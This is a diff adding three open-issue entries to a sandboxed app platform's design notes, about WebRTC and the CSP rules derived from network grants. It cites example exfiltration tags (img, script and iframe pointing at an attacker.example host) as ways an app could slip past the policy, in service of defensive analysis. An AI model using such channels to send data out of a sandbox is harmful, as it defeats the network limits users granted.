@@ -864,6 +864,91 @@ advisory rather than a build gate. Hold `check:comments` until Open point 2 is r
 
 **Needed by:** whenever the next batch of commits is written by an agent. Not blocking.
 
+### A41 — WebRTC blocking has no mechanism specified anywhere **[RESEARCH]**
+
+Found 2026-09-02 writing T22's CSP `connect-src` derivation
+(`src/broker/policy/connect-src.ts`). ADR-0006 requires that an app without a network capability
+be unable to reach the network at all, and WebRTC is a hole in that: a plain `RTCPeerConnection`
+can open a data channel or hit a STUN/TURN server without ever calling `orivon.net.connect`, and
+without going through `fetch`/`WebSocket` either — so nothing this build step touches bounds it.
+
+No mechanism is specified anywhere in the corpus. There is no `webrtc-src` in real CSP (the
+directive does not exist); nothing in this tree or the vision corpus references
+`setPermissionRequestHandler` or a Blink feature-disabling precedent for it.
+
+**This is not purely a missing-mechanism problem.** The flagship's own spike evidence
+(`week-0-spike-plan.md`) deliberately leaves WebRTC unaliased so webtorrent uses Chromium's
+native implementation — blocking WebRTC outright for a capability-less app would also break the
+flagship's own use of it, unless blocking is scoped to "no network capability granted" in a way
+nothing here yet defines. "Block WebRTC" has an unrecorded product cost, not just an unbuilt
+mechanism.
+
+**Needed by:** build step 6, before the trust indicator's C-ladder claims are shown to a user —
+a claim of "no network access" is false today for any app that tries WebRTC. Not blocking this
+PR.
+
+### A42 — what the injected CSP does not bound **[STILL OPEN]**
+
+Found 2026-09-02, same file as A41. Stated in `connect-src.ts`'s own header, recorded here so it
+is reachable outside a code comment (A40's own lesson).
+
+T22's `connect-src` bounds `fetch` and WebSocket only. `img-src`, `form-action`, navigation
+(`<a href>`, `location.href`), and `<link rel=prefetch>` are separate CSP directives this PR does
+not set, and an app can use any of them to exfiltrate data to a host `orivon.net.connect` would
+have refused — an `<img src="http://attacker.example/?d=...">` needs no capability at all under
+today's policy. ADR-0006's "the manifest genuinely bounds network reach" overstates this for
+anything beyond `fetch`/WebSocket.
+
+**Two more channels, found on review 2026-09-02, worse than the ones above.** `script-src` is
+also unset: `<script src="https://attacker.example/?d=...">` both exfiltrates AND executes
+arbitrary code at the app's own origin — data theft and code execution from one unset directive.
+`frame-src` is unset too: an app can embed `<iframe src="https://attacker.example/relay.html">`,
+whose own `'self'` is the attacker's origin (not the app's), and `postMessage` data into it —
+CSP on the app's document has no say over what the framed origin does with what it receives.
+
+Separately, and more fundamentally: CSP bounds **names**, `checkConnect` bounds **resolved
+addresses**. For a hostname pattern the two diverge exactly on DNS rebinding (T12) — a name CSP
+grants reach to can still resolve privately, reachable by `fetch` though not by
+`orivon.net.connect`. No CSP construction closes that; it is Chromium's Private Network Access
+problem, not this function's.
+
+**Needed by:** before the trust indicator (build step 6) or `security-model.md` state either gap
+as closed. Not blocking this PR — recorded so the honest scope of T22 survives past the file
+header that currently carries it alone.
+
+### A43 — a grant CSP cannot represent is omitted, which means BLOCKED, not merely uncovered **[OWNER DECISION]**
+
+Found on review 2026-09-02, same file as A41/A42. CSP's `connect-src` allowlist has no way to
+express "any public unicast address" (what a bare `*` pattern means, `security-model.md` T12) or
+a port range wider than `connect-src.ts`'s `MAX_ENUMERATED_PORTS` (16) — CSP has no range syntax,
+only an enumerable source list. `connectSrcFor` omits both rather than approximating them.
+
+**The consequence is larger than the file's own framing first suggested.** The emitted
+`connect-src` value is the app's ENTIRE allowlist for ordinary `fetch`/WebSocket calls — an
+omitted pattern is not "uncovered by CSP", it is unreachable. The flagship torrent app genuinely
+holds `tcp.connect: ["*:*"]` (`capability-api.md`), which has no CSP equivalent at all. Once
+build step 4 wires `onHeadersReceived`, that app's `connect-src` becomes `'self'` and nothing
+else — every ordinary `fetch`/WebSocket call the app's own page might make (an update check, a
+tracker announce over HTTP rather than the broker) fails, even though the broker itself would
+allow it via `orivon.net.connect`. The torrent transfers themselves are unaffected — those go
+through the broker, not through page-level `fetch`.
+
+**Owner decision, 2026-09-02: keep the lock shut tight.** Three options were on the table —
+(1) keep omitting, accept the app-side breakage as the cost of never widening CSP past what the
+user actually granted; (2) translate `*` to CSP's bare `*`, which works but also opens the app's
+page to the user's own loopback and LAN, exactly what a `*` grant explicitly excludes
+(`connect-patterns.ts`'s own `hostMatches`); (3) have `connectSrcFor` signal "this grant cannot
+be bounded by CSP" and have build step 4 skip setting the header for that origin entirely, which
+is reach-equivalent to (2) but never states a false claim in the header itself. The owner chose
+(1): CSP stays as strict as it can honestly be, `omitted` reports every unrepresentable pattern
+with an accurate reason (`host-any-public-unicast`, `port-range-too-wide`) so a later trust
+screen can explain a broken feature instead of leaving it silent, and no widening path is left
+for a future change to take by accident.
+
+**Needed by:** build step 4 (the header actually gets applied) and build step 6 (the trust
+screen needs `ConnectSrcPolicy.omitted` to explain the breakage). Not blocking this PR — the
+derivation is correct as specified; this records the decision and its cost for whoever wires it.
+
 ---
 
 ## B. Contradictions still to fix
